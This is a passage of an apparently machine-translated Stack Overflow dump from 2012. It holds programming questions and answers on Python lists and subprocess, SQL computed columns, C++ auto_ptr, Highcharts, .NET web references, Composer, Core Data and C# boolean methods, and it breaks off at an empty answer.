## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:18:25.510

PHP中有一些打印机功能可能会对您有所帮助。但是它们仅适用于 Windows 系统，我不知道它们是否仍然有效...

[http://php.net/manual/en/ref.printer.php](http://php.net/manual/en/ref.printer.php)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T15:20:58.200

您可以将此打印机设置为默认打印机并使用 javascript 代码

```
window.print(); 
```

# python - Combine two lists into one multidimensional list

> ID：12624623
> 
> 赞同：11
> 
> 时间：2012-09-27T15:13:32.443
> 
> 标签：python, list

I would like to merge two lists into one 2d list.

```
list1=["Peter", "Mark", "John"]
list2=[1,2,3] 
```

into

```
list3=[["Peter",1],["Mark",2],["John",3]] 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-09-27T15:14:23.990

```
list3 = [list(a) for a in zip(list1, list2)] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-27T15:20:20.317

An alternative:

```
>>> map(list,zip(list1,list2))
[['Peter', 1], ['Mark', 2], ['John', 3]] 
```

or in python3:

```
>>> list(map(list,zip(list1,list2)))
[['Peter', 1], ['Mark', 2], ['John', 3]] 
```

(you can omit the outer list()-cast in most circumstances, though)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-03-12T12:36:49.260

I actually used:

```
list3a = np.concatenate((list1, list2))
list3 = np.reshape(list3a, (-1,2)) 
```

because otherwise I get the error: 'list indices must be integers, not tuples' when trying to reference the array.

# sql - 在新表中一遍又一遍地使用计算字段

> ID：12624630
> 
> 赞同：0
> 
> 时间：2012-09-27T15:13:52.053
> 
> 标签：sql, sql-server

我对 SQL 很陌生，我不得不使用表进行一些计算。想象一下我们有一个包含字段的表：ID - Name - Val1 - Val2；假设我想将 2 个值相加并将其添加到我的查询结果中。我可以使用子查询轻松做到这一点，例如：

```
select val1+val2 as valtotal,* from my table. 
```

现在，如果我想对 valtotal 进行更多处理，我使用派生表，例如；

```
select valtotal*3 as ValMoreCalculated,* from
(select val1+val2 as valtotal,* from my table) AS A 
```

也许更多的代码？

```
select ValMoreCalculated/valtotal as ValEvenMoreCalc ,* from 
(select valtotal*3 as ValMoreCalculated,* from
    (select val1+val2 as valtotal,* from my table) AS A)AS B 
```

因此，如果我想使用 ValMoreCalculated 进行更多计算，我是否必须通过另一个派生表？例如，将其命名为 B？有没有更简单的方法可以在 SQL 中实现这一点？

PS：标题有点不对劲，我知道，但不知道取什么名字：P

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:16:50.467

您应该能够一举执行计算，而不是子查询。

例子：

```
select (val1+val2)*3 as ValMoreCalculated,* from my table 
```

*编辑*

我觉得有必要回应你的评论。例如，如果你想有条件地乘以 3，你可以这样做：

```
select (val1+val2)*CASE WHEN <some expression> = 'SomeValue' THEN 3 ELSE 1 END as ValMoreCalculated,* from my table 
```

*工作示例：*

```
Declare @val1 int 
Declare @val2 int 
Declare @someExpression int 
Set @val1 = 1 
Set @val2 = 2 
Set @someExpression = 1

select (@val1+@val2)*CASE WHEN @someExpression = 1 THEN 3 ELSE 1 END as ValMoreCalculated 
```

此外，为了解决您的问题编辑：

```
select ((val1+val2)*3)/(val1+val2) as ValEvenMoreCalc,* from my table 
```

关键是如果您的计算是与记录一对一的，则不需要子查询。例如，如果您想要任何分组，那么您***可以***. 如果子查询使您更容易阅读，那么这只是一个偏好问题。为了清楚起见，我倾向于使用注释。你再清楚不过了：

```
--Calculates x based on y to get a gross profit %
select ((val1+val2)*3)/(val1+val2) as ValEvenMoreCalc,* from my table 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T16:05:44.070

您的示例可以简化为不使用计算，但如果您确实需要在多个地方重用一些复杂的计算，您可以使用`cross apply`. 它仍然是子查询，但看起来有点不同。

```
select T3.ValMoreCalculated/T2.Valtotal as ValEvenMoreCalc, *
from YourTable as T1
  cross apply (select T1.Val1 + T1.Val2) as T2(ValTotal)
  cross apply (select T2.ValTotal * 3) as T3(ValMoreCalculated) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:36:22.897

如果您想要所有中间结果，您的问题的答案是您需要子查询。

大多数 SQL 方言不允许您在定义列别名的同一选择语句中使用列别名。

您可以开始创建复杂的表达式。但是，我发现子查询比不必要的复杂语句更清晰、更易于维护。

我想补充两点。首先，在这种情况下使用子查询不会影响性能。如果这是您的问题，则数据只读取一次。

其次，您可能对表上的计算列感兴趣。这是 SQL Server 的一项功能，允许您定义一个新列，该列派生自表中的其他列。因此，valTotal 可以作为表达式存储在表中，而不会占用任何数据空间。

# android - ICS 中的小部件尺寸

> ID：12624634
> 
> 赞同：3
> 
> 时间：2012-09-27T15:14:03.177
> 
> 标签：android, widget, android-4.0-ice-cream-sandwich

我有一个具有不同尺寸的应用程序，即 4x1、4x2 和 5x2。小部件 minWidgt 和 minHeight 是，

4x1：250dp x 40dp

4x2：250dp x 110dp

5x2：320dp x 110dp

每个小部件在小部件提供者 xml 文件中使用不同的布局。

在 Gingerbread 上，当我尝试在主屏幕上添加小部件时，小部件显示正确，即 4x1、4x2 和 5x2。在 ICS 上，它们显示为 4x1、4x2 和 4x2。有谁知道为什么？小部件接收器定义（在清单文件中）中的小部件标签被正确定义为资源字符串（widget_4x1、widget_4x2 等）。

有谁知道问题是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:33:29.450

我认为在 ICS 源代码中进行了更改，不允许您将小部件的默认大小设置为大于 4x4

[http://developer.android.com/guide/topics/appwidgets/index.html](http://developer.android.com/guide/topics/appwidgets/index.html)

**注意：**为了使您的应用小部件可跨设备移植，您的应用小部件的最小尺寸不应大于 4 x 4 单元格。

您的小部件的尺寸大于 4....

只需让用户重新调整小部件的大小：

```
android:resizeMode="horizontal|vertical" 
```

# c++ - 带有 auto_ptr 的 C++ 初始化程序列表

> ID：12624636
> 
> 赞同：1
> 
> 时间：2012-09-27T15:14:05.343
> 
> 标签：c++, smart-pointers

这是如何编译和工作的：

```
class MyObject {
public:
  MyObject() {}
};

struct ItemGood {
  int Number;
  MyObject *Object;

  ItemGood(int Number, MyObject *Object) {
    this->Number = Number;
    this->Object = Object;
  }
};

const ItemGood ItemGoodList[] =
{
  { 0, new MyObject() },
  { 1, new MyObject() }
}; 
```

这根本不编译：

```
class MyObject {
public:
  MyObject() {}
};

struct ItemBad {
  int Number;
  std::auto_ptr<MyObject> AutoObject;

  ItemBad(int Number, MyObject *Object) {
    this->Number = Number;
    AutoObject = std::auto_ptr<MyObject>(Object);
  }
};

const ItemBad ItemBadList[] =
{
  { 0, new MyObject() },
  { 1, new MyObject() }
}; 
```

编译器吐出的错误是：

> 没有匹配函数调用 'ItemBad::ItemBad(ItemBad)

我不明白为什么有些东西试图调用该构造函数，我不明白这个初始化列表中实际发生了什么。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:30:23.007

试试这个：

```
ItemBad(int Number, MyObject *Object) : Number(Number), AutoObject(Object) 
{} 
```

似乎`std::auto_ptr`您的平台上没有复制构造函数，因此必须在构造函数的主体之前对其进行初始化。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:33:06.510

因为`std::auto_ptr`没有正确的复制构造函数，这意味着您的类没有正确的复制构造函数，这意味着它不能从临时构造 - 这是您正在尝试做的。

只是垃圾`auto_ptr`并移动到`unique_ptr`。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:39:02.210

此外，您应该避免使用这样的初始化列表：

```
{ 0, new MyObject() } 
```

相反，使用构造函数：

```
ItemBad(0, new MyObject()) 
```

例如，MSVC 编译器会为您的“好”变体和“坏”变体生成错误：只要您的类有一个 ctor，您就必须使用它，而不是初始化列表。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-27T15:52:23.280

每个`{ 0, new MyObject() }`表达式都被一个构造函数调用替换`ItemGood(int Number, MyObject *Object)`，所以编译器做了这样的事情：

```
const ItemGood ItemGoodList[] =
{
  ItemGood(0, new MyObject()), // temporal 'ItemGood' 1 (const &)
  ItemGood(1, new MyObject())  // temporal 'ItemGood' 2 (const &)
}; 
```

然后调用编译器生成的复制协构函数 for`ItemGood`来填充每个的数组槽`ItemGood`，这里没有问题

类`ItemBad`声明包含成员变量`std::auto_ptr<MyObject> AutoObject`，并且如另一个答案中所指出的那样，`std::auto_ptr`没有复制构造函数，因此编译器*无法*为`ItemBad`. 当应用前面的逻辑时，我们得到与 with 相同的表达式替换`ItemGood`

```
const ItemBad ItemGoodList[] =
{
  ItemBad(0, new MyObject()), // temporal 'ItemBad' 1 (const &)
  ItemBad(1, new MyObject())  // temporal 'ItemBad' 2 (const &)
}; 
```

但是这里我们没有copy-constructor，所以出现了你报的错误，在`ItemBad`构造函数中使用初始化列表并不能解决问题，删除`MyObject`赋值也不能解决问题

```
ItemBad(int Number, MyObject *Object) {
   this->Number = Number;
   // AutoObject = std::unique_ptr<MyObject>(Object);  This comment doesn't solve the problem
} 
```

`unique_ptr`如前所述更改为，或使用 boost [shared_ptr](http://www.boost.org/doc/libs/1_42_0/libs/smart_ptr/shared_ptr.htm)

# python - 如何打印python模块层次结构？

> ID：12624637
> 
> 赞同：1
> 
> 时间：2012-09-27T15:14:05.810
> 
> 标签：python

我有一个动态加载的文件。由于动态加载，我不知道它的模块路径是什么，到目前为止我所有的最佳猜测（根据文件系统结构）都失败了。

1.  如何从正在运行的文件中检查完整的模块路径？
2.  如何以编程方式遍历层次结构？

(Python 2.6)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:19:37.147

如果您无论如何都能够导入该模块运行时，则您可以访问`__file__`它的属性，这将为您提供模块的确切位置。

例如：

```
In [1]: import os

In [2]: print os.path.dirname(os.__file__)
/usr/lib/python2.7 
```

# highcharts - highcharts/股票图表自定义工具栏按钮文本/标题

> ID：12624639
> 
> 赞同：0
> 
> 时间：2012-09-27T15:14:11.883
> 
> 标签：highcharts, highstock

我想知道如何自定义自定义按钮的工具提示。

自定义按钮的所有示例都是[这样](http://jsfiddle.net/fXHB5/3496/)的`_titleKey: 'printButtonTitle'`

将此设置为其他任何内容都会导致`undefined`工具提示。我花了一段时间查看创建它的源代码但找不到它。

虽然使用类似 id 的东西并用 jquery 替换它，`$('#foo-button title').html('yey');`但自定义按钮没有分配 id。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-27T18:16:51.133

尽管接受了答案，但我想提出一个替代解决方案。Highcharts 确实提供了一种为自定义按钮设置自定义标题的方法（不幸的是，虽然没有很好的文档记录）。Highchart 从其全局语言对象中读取字符串[`Highchart.lang`](http://api.highcharts.com/highstock#lang)。要拥有自定义标题，您需要使用全局方法在此对象中添加按钮标题作为新属性（您可以通过名称调用新属性，保留的属性除外），`Highcharts.setOptions()`如下所示

```
Highcharts.setOptions({
    lang: {
        myButtonTitle: "Don't Click"
    }
}); 
```

要记住的一件事是这是一个全局属性，因此需要在调用构造函数之前进行设置，并且您必须在 Highcharts 命名空间中调用它，而不是作为单个图表选项的一部分。

您现在可以在按钮中使用上面设置的标题，方法是`_titleKey`为按钮指定一个属性，其值对应于上面用于设置名称的键

```
exporting: {
    buttons: {
        'myButton': {
            _id: 'myButton',
            symbol: 'diamond',
            x: -62,
            symbolFill: '#B5C9DF',
            hoverSymbolFill: '#779ABF',
            onclick: function() {
                alert('click!')
            },
            _titleKey: "myButtonTitle"

        }
    }
} 
```

[自定义按钮标题 | Highcharts & Highstock @ jsFiddle](http://jsfiddle.net/jugal/hq93c/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-27T17:26:26.380

您可以使用 jQuery 设置`id`按钮`_id`，然后使用 jQuery 对其进行更新。

```
exporting: {
    buttons: {
        'myButton': {
            _id: 'myButton',
            symbol: 'diamond',
            x: -62,
            symbolFill: '#B5C9DF',
            hoverSymbolFill: '#779ABF',
            onclick: function() {
                alert('click!')
            }
        }
    }
}

var buttonTitle = 'updated title';
jQuery("#myButton").attr('title', buttonTitle).children().text(buttonTitle); 
```

[**演示**](http://jsfiddle.net/fXHB5/8137/)

# web-services - 网页参考配置问题

> ID：12624640
> 
> 赞同：5
> 
> 时间：2012-09-27T15:14:14.347
> 
> 标签：web-services, web-config, asmx, web-reference

我正在努力解决如何将 URL 配置为 Web 参考。

情况就是这样。我有：旧的 asp.net webservices <----- 编译为 dll 的 c# 项目 <----- 引用 dll 的网站（以前不存在 c# 项目，但我将所有代码重构为单独项目）

所以网站代码调用c#项目的代码来获取结果，结果又调用了webservice。

在 c# 项目中添加 Web 引用时，我输入了 Web 服务的 url 位置（[http://192.168.10.1/TestServices.asmx?wsdl](http://192.168.10.1/TestServices.asmx?wsdl)。然后生成一个包含 Web 服务 url 的 app.config 文件。

如果我将 Web 引用设置为静态而不是不应使用配置，那是有效的。现在，如果我将 web 引用设置为动态，则应该使用配置，但由于这是一个正在编译为 dll 的项目，并且网站没有 app.config，而是我将 app.config 中的配置设置为我的web.config appSettings 节点，我将 Web 服务的 url 更改为另一个（[http://192.168.10.2/TestServices.asmx](http://192.168.10.2/TestServices.asmx)。

该网站仍然从在 c# 项目中添加 Web 引用时指向的旧 URL 获取结果，因此当 URL 行为设置为动态时，似乎未使用配置设置。

我可能在这里遗漏了一些微不足道的东西吗？

这是 app.config 中的内容：

```
<applicationSettings>
     <XXXX.Properties.Settings>
      <setting name="XXXX_TestServices_TestServices" serializeAs="String">
       <value>http://192.168.10.1/TestServices.asmx</value>
      </setting>
     </XXXX.Properties.Settings>
    </applicationSettings> 
```

这就是我放在 web.config 中的内容：

```
<appSettings>
     <add key="XXXX_TestServices_TestServices" value="http://192.168.10.2/TestServices.asmx" />
</appSettings> 
```

所以，现在在输入问题以及仔细检查和搜索相关问题时，它总是很有趣和信息丰富/有教育意义，你终于自己解决了这个问题。无论如何我都会发布它并附上答案，因为我没有找到确切的答案放置，但通过结合其他 2 个问题和博客文章。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-27T15:14:14.347

一些资源提到您需要创建一个设置并且需要在您的代码中更改 Web 服务代理对象的 url 属性。这不是必需的，您只需要以正确的方式编辑您的网络配置。

该 url 不会像直接从网站引用 Web 服务时那样进入 web.config 的 appSettings 部分。

相反，您需要从您的 dll 项目生成的 app.config 中复制整个配置代码，包括定义用于设置正确 url 的 applicationSettings 节点的 sectiongroup 配置。

对于这个在 web.config 中包含以下配置代码的特定示例：

```
<configuration>
  <configSections>
    <sectionGroup name="applicationSettings" type="System.Configuration.ApplicationSettingsGroup, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
      <section name="XXXX.Properties.Settings" type="System.Configuration.ClientSettingsSection, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
    </sectionGroup>
  </configSections>
...
</configuration>

<applicationSettings>
    <XXXX.Properties.Settings>
      <setting name="XXXX_TestServices_TestServices" serializeAs="String">
        <value>http://192.168.10.2/TestServices.asmx</value>
      </setting>
    </XXXX.Properties.Settings>
</applicationSettings> 
```

# python - Python 子进程：命令在 Python 中失败，但在 Shell 中有效

> ID：12624646
> 
> 赞同：2
> 
> 时间：2012-09-27T15:14:25.280
> 
> 标签：python, command-line, subprocess

我正在尝试通过 Python 的子进程运行命令，但它无法正常运行。如果我在 shell 中输入：

```
pack < packfile.dat 
```

`pack`我的软件在哪里，`packfile`是输入文件，那么软件运行良好。

如果我在 python 中尝试这个：

```
import subprocess as sp
import shlex

cmd = 'pack < packfile.dat'.split()
p = sp.Popen(cmd) 
```

软件抱怨：

```
Pack must be run with: pack < inputfile.inp 

Reading input file... (Control-C aborts) 
```

它挂在那里。

最后一部分是特定于我的软件的，但事实是运行相同命令的两种方法会产生不同的结果，而事实并非如此。

谁能告诉我我做错了什么？

实际上，我打算最终这样做：

```
p = sp.Popen(cmd,stdout=sp.PIPE,stderr=sp.PIPE)
stdout, stderr = p.communicate() 
```

由于我对此有点陌生，如果这不是最佳实践，请告诉我。

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T15:17:52.280

I/O 重定向是 shell 的产物，默认情况下 Popen 不使用它。试试这个：

```
p = sp.Popen(cmd, shell=True) 
```

[subprocess.Popen() IO 重定向](https://stackoverflow.com/questions/8902206/subprocess-popen-io-redirect)

从那里您还会看到有些人不喜欢 shell 选项。在这种情况下，您可能可以通过以下方式完成它：

```
with open('input.txt', 'r') as input:
    p = subprocess.Popen('./server.py', stdin=input) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:18:46.337

“<”不是命令的参数，也不应该作为一个参数传递。

尝试：

```
p = sp.Popen(cmd,stdout=sp.PIPE,stderr=sp.PIPE, stdin=open('packfile.dat')) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-27T15:18:48.007

试试这个：

```
import subprocess as sp
p = sp.Popen(['pack'], stdin = open('packfile.dat', 'r')) 
```

# javascript - 谷歌通过 HTML 文本链接翻译？

> ID：12624651
> 
> 赞同：1
> 
> 时间：2012-09-27T15:14:32.650
> 
> 标签：javascript, html, google-translate

用户点击链接后，是否可以让谷歌翻译来翻译文本？

我刚刚获得了谷歌翻译工具，但我想要一个自定义的“翻译这个”按钮或链接，而不是下拉列表（它被时尚的设计弄乱了）。这可能吗？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-28T18:16:10.853

这是不可能的，因为 Google 的翻译此页面链接到其服务器上的外部脚本。机器翻译不能替代人工或人工翻译。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T07:22:37.067

您可以使用以下代码创建翻译链接：

```
<a href="#" class="adressstyle" target="_blank" rel="nofollow" onclick="window.open('http://www.google.com/translate?u='+encodeURIComponent(location.href)+'&amp;langpair=en%7Cfr&amp;hl=en&amp;ie=UTF8'); return false;" title="Google-Translate-English to French ">French</a> 
```

我应用此的示例网站：http: [//www.mandirpalace.com](http://www.mandirpalace.com)

# php - Composer：直接在供应商包中开发

> ID：12624653
> 
> 赞同：8
> 
> 时间：2012-09-27T15:14:36.957
> 
> 标签：php, git, composer-php

我有一个使用 Composer 的 PHP 项目。

我自己的主库实际上是一个必需的包，因为我还在构建一个“独立版本”供人们安装（不仅仅是库），因此它位于`vendor`目录中。

我开发项目的大部分时间都发生在那个供应商包中，它已经是一个 Git 克隆，但不在任何分支上。我可以通过运行足够快地改变它`git checkout master`。但是，每次我运行时`composer update`，它要么抱怨目录很脏，要么签出一个新副本，我必须从那里开始，而不再是在一个分支上。

所以，我的问题是：Composer 是否有某种模式可以仅获取该仓库中的更改？或者在开发主包的同时开发（或只是贡献）供应商包的首选方式是什么？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-10T09:21:48.060

几分钟前，作曲家更新现在会询问您是要还原更改还是要在软件包更新之前/之后进行存储/应用。这应该对解决此类问题有很大帮助，有关详细信息，请参阅[https://github.com/composer/composer/pull/1188](https://github.com/composer/composer/pull/1188)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-27T15:17:36.253

您可以通过在更新命令的末尾指定它们来仅更新单个或几个包：

```
composer update pkg1 pkg2 ... 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-11-21T23:39:29.053

经过这么多年......我创建了一个[包](https://github.com/franzliedke/studio)，它可以在使用 Composer 包的同时轻松开发它们，利用 Composer 的“路径存储库”，但不必触摸 composer.json，这在存储库中可能不理想与其他开发者共享。

无耻的插件，但这是我自己的问题，所以我希望这没问题。:)

# ios - 使用“无操作”删除规则并改用 prepareForDeletion

> ID：12624659
> 
> 赞同：1
> 
> 时间：2012-09-27T15:15:00.747
> 
> 标签：ios, core-data, nsmanagedobject

我目前有两个实体，一个类别实体和一个项目实体，其中 Category:Item 是 1:m。

我已将“无操作”规则应用于 Category -> Item 关系，并实施 Category.prepareForDeletion 以在删除类别之前将类别中的所有项目移动到一个特殊的 catch-all 类别（catch-all 类别不可删除）。

```
- (void)prepareForDeletion {
    Category *misc = [Database theMiscCategory];
    [misc addItems:self.items];
    [super prepareForDeletion];
} 
```

我的问题是：我错过了什么吗？如果没有，我该如何关闭关于“无操作”作为高级功能的 XCode 警告？

FTR，我没有使用 nullify，因为它更方便应用程序的其他区域转储“杂项”类别中的内容，而不是处理具有 null 类别的项目。我最初确实尝试过，但是遇到了一些意外的行为-如果我首先调用 super ，则在我可以收集要更改的项目集之前，关系就被取消了，如果我把它放在之后，那么与新类别的关系就得到了作废。我想我可以收集它们，然后调用 super，然后设置新类别，但这似乎很笨拙。

所以我确实认为“无操作”是我想要的，只是想确保我没有遗漏我应该在 prepareForDeletion 中管理的任何其他内容。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T16:35:31.667

“无操作”产生警告的原因是管理和之间的关系`Category`现在`Item`由您决定。

因此，如果您在 中`Category`调用`myCategory`了 5 个 Item 对象`myCategory.items`，并且您 delete `myCategory`，这 5 个`Item`对象仍会认为它们与`myCategory`已删除的关系有关系。

您最好的选择是将规则改回“Nullify”，让 Core Data 为您处理关系管理。你仍然可以做你正在做的事情，`prepareForDeletion`因为此时`self.items`仍然包含`Item`对象。

如果出于其他原因必须保持“无操作”规则，则需要确保每个`Item`in`self.items`将其`.category`属性设置为 nil 期间`prepareForDeletion`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-24T02:41:38.370

因此，在阅读和浸泡时间之间，答案似乎很简单：是的，如果您有理由使用“nullify”，那么您需要做的是适当地实施 prepareForDeletion 以保持参照完整性。

# linux - Linux：使用另一个文件夹中的符号链接执行时找不到 bin 文件

> ID：12624661
> 
> 赞同：1
> 
> 时间：2012-09-27T15:15:14.810
> 
> 标签：linux, command, hyperlink, bin

在 Linux 中，我有一个指向.bin 文件的**符号链接：**

```
~/bin> 
```

所以我有：

```
~/bin>l

lrwxrwxrwx  1 myuser mymachine    56 Sep 27 09:25 Myfile.bin -> ./otherFolder/Myfile.bin 
```

如果我在“bin”文件夹中执行这个.bin，就没有问题：

```
~/bin>Myfile.bin 
```

但如果我从另一个文件夹执行它：

```
~/other>../bin/Myfile.bin 
```

结果是：

```
-bash: /home/myuser/bin/Myfile.bin: No such file or directory 
```

为什么会这样？

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T15:22:33.040

我认为您的*符号链接*已损坏。

什么是输出

```
cd ~/bin
file ./otherFolder/Myfile.bin 
```

?

**编辑**

如果你这样做：

```
~/bin>Myfile.bin 
```

您从 PATH 运行 Myfile.bin，这不是必需的 ~/bin，这取决于您的 $PATH 变量。

# php - 如何在 SQL 中使用布尔值

> ID：12624664
> 
> 赞同：0
> 
> 时间：2012-09-27T15:15:17.000
> 
> 标签：php, mysql

我有这个很长的查询可以正常工作。我需要向`boolean`它添加一个元素。

编辑：查询已更新。下面反映答案。新问题：对于每个项目，它现在为每个评级显示一行。例如，如果有 4 个人评价它，如果我是评价者之一，它将显示一行 isMatched = 1；其他三个将是 isMatched = 0。如果有两个老鼠，而我都不是，isMatched 显示 0 两次。

```
 $result=mysql_query("
                SELECT i.item,
                    IF (ra.user_id = '{user}',1,0) AS isMatched, 
                r.ratetotal AS total,
                c.commtotal AS comments,
                r.rateav AS rate
                FROM items AS i
                LEFT JOIN master_cat AS c
                    ON (c.cat_id = i.cat_id)
                    LEFT JOIN ratings AS ra
                            ON (i.items_id = ra.item_id)
                LEFT JOIN
                    (SELECT item_id, 
                    COUNT(item_id) AS ratetotal, 
                    AVG(rating) AS rateav 
                    FROM ratings GROUP BY item_id) AS r 
                ON r.item_id = i.items_id
                LEFT JOIN
                    (SELECT item_id, 
                    COUNT(item_id) AS commtotal 
                    FROM comments GROUP BY item_id) AS c
                ON c.item_id = i.items_id
                WHERE c.category = '{$cat}'  AND i.spam < 30
                 {$order};"); 
```

我想为此添加一个更多功能。这是一个基于用户的系统，一些用户会在名为 的表中对项目进行评分`ratings`。表中的每个评级也会有一个`user_id`匹配`item_id`每行中的评级的人。`WHERE`在上面未显示的 PHP 代码中，我将与我的子句 的 user_id 进行比较。

我只是想在`boolean`这个查询中添加某种类型，它会在其中创建一个新列来显示`user_id`当前登录用户是否与真/假匹配。

最终，我以 JSON 格式将其打印出来，并推送到 Java 以获取 Android 应用程序。在应用程序中，`istView`如果 SQL 查询找到任何“真”匹配项，我希望 中的任何项目都显示为“粗体”。最后一点与SQL无关，我只是想解释一下应用程序。

这个查询可以这样修改吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T16:07:33.303

它可能有效：

像这样编辑 SQL 的开头：

```
$result=mysql_query("
            SELECT i.item,
            IF(i.user_id={$userID},1,0) AS isMatched, /* Added this line assuming you have user IDs in i.user_id column of DB and $userID var of PHP contains current user ID */
            r.ratetotal AS total,
            c.commtotal AS comments,
            r.rateav AS rate
            FROM items AS i
            LEFT JOIN master_cat AS c
                ON (c.cat_id = i.cat_id)
            LEFT JOIN
                (SELECT item_id, 
                COUNT(item_id) AS ratetotal, 
                AVG(rating) AS rateav 
                FROM ratings GROUP BY item_id) AS r 
            ON r.item_id = i.items_id
            LEFT JOIN
                (SELECT item_id, 
                COUNT(item_id) AS commtotal 
                FROM comments GROUP BY item_id) AS c
            ON c.item_id = i.items_id
            WHERE c.category = '{$cat}'  AND i.spam < 30
             {$order};"); 
```

现在，您将获得`isMatched`包含 0 或 1 值的结果。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T16:13:43.237

我不相信 mysql 有一个真正的布尔类型。我通常使用 tinyInt 并设置为 0 或 1。

您可以在选择查询中使用 mysql IF 语句。假设您的用户表是 u 并且您的用户 id 字段是 user_id

```
 IF (u.userId = '{$user_id}', 1, 0) as user_boolean 
```

但是，我不确定这是否真的适用于您的查询，因为您的查询正在获取聚合数据，而不是单个用户的评分。我必须有更多信息（如表格、字段和关系）才能进一步提供帮助。

# c# - 带有布尔返回的方法

> ID：12624666
> 
> 赞同：4
> 
> 时间：2012-09-27T15:15:20.973
> 
> 标签：c#, if-statement, return

我正在制作一个带有`bool`返回值的方法，但遇到了问题：

这有效

```
private bool CheckAll()
{
  //Do stuff
  return true;
} 
```

但这不是，如果返回值在 IF 语句中，则该方法无法检测到返回值。

```
private bool CheckAll()
{
  if (...)
  {
    return true;
  }
} 
```

我怎样才能解决这个问题？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-09-27T15:18:15.103

```
private bool CheckAll()
{
    if ( ....)
    {
        return true;
    }

    return false;
} 
```

当 if 条件为 false 时，该方法不知道应该返回什么值（您可能会收到类似“并非所有路径都返回值”的错误）。

正如[CQQL 指出的那样，](https://stackoverflow.com/a/12624764/1376657)如果你的意思是在你的 if 条件为真时返回真，你可以简单地写：

```
private bool CheckAll()
{
    return (your_condition);
} 
```

如果您有副作用，并且想在返回之前处理它们，则需要第一个（长）版本。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-27T15:20:06.743

长版：

```
private bool booleanMethod () {
    if (your_condition) {
        return true;
    } else {
        return false;
    }
} 
```

但是由于您使用的是您的条件的结果作为方法的结果，您可以将其缩短为

```
private bool booleanMethod () {
    return your_condition;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-10-12T17:43:28.367

```
 public bool roomSelected()
    {
        int a = 0;
        foreach (RadioButton rb in GroupBox1.Controls)
        {
            if (rb.Checked == true)
            {
                a = 1;
            }
        }
        if (a == 1)
        {
            return true;
        }
        else
        {
            return false;
        }
    } 
```

这就是我解决问题的方法

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2015-11-24T15:05:58.500

一种更简单的解释方式，

```
public bool CheckInputs(int a, int b){
public bool condition = true;

if (a > b || a == b)
{
   condition = false;
}
else
{
   condition = true;
}

return condition;
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-02-16T17:39:11.017

您缺少其他部分。如果所有条件都为假，那么 else 将在您尚未声明并从 else 分支返回任何内容的情况下工作。

```
private bool CheckALl()
{
  if(condition)
  {
    return true
  }
  else
  {
    return false
  }
} 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2015-11-14T17:10:41.830

使用此代码：

```
public bool roomSelected()
{
    foreach (RadioButton rb in GroupBox1.Controls)
    {
        if (rb.Checked == true)
        {
            return true;
        }
    }
    return false;
} 
```

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2020-09-03T14:35:16.713

我敢肯定，当您提出问题时，这些选项在 C# 中都不可用，但现在您可以这样做：

```
// Return with ternary conditional operator.
private bool CheckAll()
{
    return (your_condition) ? true : false;
}

// Alternatively as an expression bodied method.
private bool CheckAll() => (your_condition) ? true : false; 
```

# c# - C# 正则表达式替换使用匹配值

> ID：12624669
> 
> 赞同：3
> 
> 时间：2012-09-27T15:15:29.960
> 
> 标签：c#, regex

我正在尝试用 C# 编写一个函数，用自定义字符串替换所有出现的正则表达式模式。我需要使用匹配字符串来生成替换字符串，所以我试图循环匹配而不是使用 Regex.Replace()。当我调试我的代码时，正则表达式模式匹配我的 html 字符串的一部分并进入 foreach 循环，但是 string.Replace 函数不会替换匹配项。有谁知道是什么导致这种情况发生？

我的功能的简化版本：-

```
public static string GetHTML() {
    string html = @"
        <h1>This is a Title</h1>
        @Html.Partial(""MyPartialView"")
    ";

    Regex ItemRegex = new Regex(@"@Html.Partial\(""[a-zA-Z]+""\)", RegexOptions.Compiled);
    foreach (Match ItemMatch in ItemRegex.Matches(html))
    {
        html.Replace(ItemMatch.Value, "<h2>My Partial View</h2>");
    }

    return html;
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-27T15:16:46.683

